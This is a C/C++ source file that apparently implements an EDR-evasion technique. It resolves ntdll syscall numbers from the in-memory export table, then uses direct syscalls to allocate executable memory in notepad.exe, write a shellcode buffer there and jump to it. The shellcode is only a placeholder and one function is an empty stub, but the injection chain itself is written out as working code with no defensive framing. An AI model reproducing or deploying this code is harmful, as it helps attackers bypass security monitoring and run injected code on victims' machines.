#include "lib.h"


typedef struct __LDR_DATA_TABLE_ENTRY {
	_LIST_ENTRY		InLoadOrderLinks;
	_LIST_ENTRY		InMemoryOrderLinks;
	_LIST_ENTRY		InInitializationOrderLinks;
	LPVOID			DllBase;
	LPVOID			EntryPoint;
	UINT32			SizeOfImage;
	_UNICODE_STRING	FullDllName;
	_UNICODE_STRING	BaseDllName;
} ___LDR_DATA_TABLE_ENTRY, *___PLDR_DATA_TABLE_ENTRY;


VOID create_vxtable(VX_TABLE* vx_table, DWORD64 api_addr) {
	
	vx_table->api_addr = api_addr;
	vx_table->syscall_no = *(DWORD*)((unsigned char*)api_addr + 4);
	vx_table->jump_addr = (DWORD64)((unsigned char*)api_addr + 0x12);

}


DWORD64 get_dllbase(wchar_t* dll_name) {

	TEB* teb = (TEB*)__readgsqword(offsetof(NT_TIB, Self));
	PEB* peb = teb->ProcessEnvironmentBlock;

	LIST_ENTRY *first = &peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *head = first->Flink;

	do {
		___LDR_DATA_TABLE_ENTRY* entry = (___LDR_DATA_TABLE_ENTRY*)((unsigned char*)head - sizeof(LIST_ENTRY));
		if (wcscmp(entry->BaseDllName.Buffer, dll_name) == 0) {
			wprintf(L"matched dll_name: %ws\tdll_base: %I64x\n", entry->BaseDllName.Buffer, entry->DllBase);
			return (DWORD64)entry->DllBase;
		}
		
		head = head->Flink;
	} while (head != first);

	return 0;
}


std::vector<VX_TABLE> get_vx_table_list() {
	
	wchar_t dll_name[] = L"ntdll.dll";
	std::vector<VX_TABLE> vxtable_list;

	DWORD64 dll_base = get_dllbase(dll_name);

	IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_base;
	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)(dll_base + dos_header->e_lfanew);

	IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)(dll_base + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD64 addr_name_ordinal = export_dir->AddressOfNameOrdinals;
	DWORD64 addr_functions = export_dir->AddressOfFunctions;
	DWORD64 addr_names = export_dir->AddressOfNames;

	WORD* name_ordinal_arr = (WORD*)(dll_base + addr_name_ordinal);
	DWORD* name_arr = (DWORD*)(dll_base + addr_names);
	DWORD* func_arr = (DWORD*)(dll_base + addr_functions);

	for (WORD i = 0; i < export_dir->NumberOfNames; i++) {

		DWORD ordinal_val = name_ordinal_arr[i];
		DWORD name_addr = name_arr[i];
		DWORD func_addr = func_arr[ordinal_val];

		CHAR* name = (CHAR*)(name_addr + dll_base);
		DWORD64 func_offset = (func_addr + dll_base);

		VX_TABLE func_vx;
		func_vx.name = name;
		create_vxtable(&func_vx, func_offset);
		vxtable_list.push_back(func_vx);

	}

	return vxtable_list;
	
}

HANDLE get_process_handle() {

	PROCESSENTRY32 pe32;
	HANDLE hsnap, hProcess;
	wchar_t pname[] = L"notepad.exe";

	hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hsnap == INVALID_HANDLE_VALUE) {
		return (HANDLE)-1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hsnap, &pe32);

	do {
		if (wcscmp(pe32.szExeFile, pname) == 0) {
			printf("pid for notepad.exe is: %x\n", pe32.th32ProcessID);
			return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		}
		/*if (pe32.th32ProcessID == GetCurrentProcessId()) {
			return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		}*/
	} while (Process32Next(hsnap, &pe32));

}

std::vector<VX_TABLE> parse_ntdll_on_disk() {
	char filename[] = "C:\\windows\\system32\\ntdll.dll";
}




void set_syscall_params(std::vector<VX_TABLE> vxtable_list, char* api_name) {

	for (int i = 0; i < vxtable_list.size(); i++) {
		if (strcmp(api_name, vxtable_list[i].name) == 0) {
			printf("jump_addr: %I64x\tsyscall_no: %x\t%s\n", vxtable_list[i].jump_addr, vxtable_list[i].syscall_no, vxtable_list[i].name);
			GetSyscall(vxtable_list[i].syscall_no);
			GetSyscallAddr(vxtable_list[i].jump_addr);
			break;
		}
	}
}


void MyCreateFile(std::vector<VX_TABLE> vxtable_list) {

	set_syscall_params(vxtable_list, (char*)"NtCreateFile");

	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = NULL;
	UNICODE_STRING fileName;
	IO_STATUS_BLOCK osb;

	RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\temp\\test.txt");
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SyscallNtCreateFile(
		&fileHandle,
		FILE_GENERIC_WRITE,
		&oa,
		&osb,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	printf("fh: %I64x\n", fileHandle);
}


void MyNtAllocateVirtualMemory(std::vector<VX_TABLE> vxtable_list) {

	PVOID baseAddr = NULL;
	HANDLE hProcess = NULL;
	SIZE_T RegionSize = 0x5000;
	NTSTATUS status;
	unsigned char shellcode[] = "\xff\xff\xff\xff";
	DWORD shellcode_size = sizeof(shellcode);

	hProcess = get_process_handle();
	set_syscall_params(vxtable_list, (char*)"NtAllocateVirtualMemory");
	//GetSyscall(0x18);
	status = SyscallZwAlloacteVirtualMemory(hProcess, &baseAddr, 0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	printf("status: %x\n", status);
	printf("baseAddress: %I64x\n", baseAddr);
	set_syscall_params(vxtable_list, (char*)"NtWriteVirtualMemory");
	//GetSyscall(0x3A);
	status = SyscallNtWriteVirtualMemory(hProcess, baseAddr, (PVOID)shellcode, shellcode_size, 0);

	printf("SyscallNtWriteVirtualMemory status: %x\n", status);

	JumpToShellcode((DWORD64)baseAddr);

	getchar();

}
